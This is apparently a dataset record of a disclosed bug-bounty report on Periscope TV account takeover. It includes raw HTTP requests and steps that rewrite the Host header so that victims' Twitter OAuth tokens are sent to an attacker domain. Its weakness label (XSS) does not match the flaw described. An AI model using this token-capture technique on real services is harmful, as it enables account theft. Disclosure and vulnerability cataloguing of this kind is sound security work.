@@ -1,0 +1,50 @@
+{
+  "reported_to": "X (Formerly Twitter)",
+  "reported_by": "ngalog ",
+  "title": "Account Takeover in Periscope TV",
+  "content": "\nSummary:\nWhen you login periscope.tv using twitter, and change the host header from www.periscope.tv to attacker.com/www.periscope.tv, the oauth redirect destination will be attacker.com/www.periscope.tv, thus allowing attacker to send the oauth authorize link to victim, and takeover their account after auto redirect.\nSteps To Reproduce:\nVisit https://www.periscope.tv/ and click login with twitter, a request should appear\nCode 266 Bytes\n1GET /i/twitter/login?csrf=\u2588\u2588\u2588\u2588 HTTP/1.1\n2Host: www.periscope.tv\n3User-Agent: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n5Accept-Language: en-US,en;q=0.5\n6Accept-Encoding: gzip, deflate\n7Referer: https://www.periscope.tv/\n8cookie: ...\nChange the host header to\nHost: hackerone.com/www.periscope.tv\nFull request\nCode 282 Bytes\n1GET /i/twitter/login?csrf=\u2588\u2588\u2588\u2588\u2588\u2588 HTTP/1.1\n2Host: hackerone.com/www.periscope.tv\n3User-Agent: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n5Accept-Language: en-US,en;q=0.5\n6Accept-Encoding: gzip, deflate\n7Referer: https://www.periscope.tv/\n8cookie: ...\nResponse should be something like\nCode 140 Bytes\n1<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"0;https://twitter.com/oauth/authenticate?oauth_token=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\"></head></html>\nSend this link to victim, after authorizing, victim's twitter oauth token and verifier is sent to hackerone.com, attacker could now reuse the same token to takeover victim's account.\nVimeo: https://vimeo.com/256356501\npassword: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\nImpact\nAccount Takeover for periscope.tv\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Cross-site Scripting (XSS) - Generic"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1536262620,
+  "report_url": "https://hackerone.com/reports/317476",
+  "is_multi_component": true,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Visit https://www.periscope.tv/ and click login with Twitter"
+    ],
+    [
+      2,
+      "Intercept the login request and change the Host header to attacker.com/www.periscope.tv"
+    ],
+    [
+      3,
+      "Send the modified OAuth redirect link to the victim"
+    ],
+    [
+      4,
+      "After victim authorization, capture their OAuth token and verifier from attacker.com"
+    ]
+  ],
+  "vuln_description": "The vulnerability allows an attacker to perform an account takeover on Periscope TV by manipulating the Host header during Twitter OAuth login. When the victim authorizes the login, their OAuth token is sent to the attacker's domain instead of Periscope's, enabling the attacker to gain control of the victim's account.",
+  "reason": "The attack involves a single straightforward component (Host header manipulation) with no complex interactions or state manipulations required. The technique is well-known in web security testing.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "authnz_metadata": {
+    "reason": "The vulnerability involves manipulating the Host header during the OAuth flow, which is a specific request modification that wouldn't be captured by the normal user navigation and request logging described in the methodology. The methodology focuses on swapping user sessions, actions, and resource IDs within the same application context, not on manipulating HTTP headers to redirect OAuth flows to attacker-controlled domains.",
+    "is_detectable": false
+  }
+}
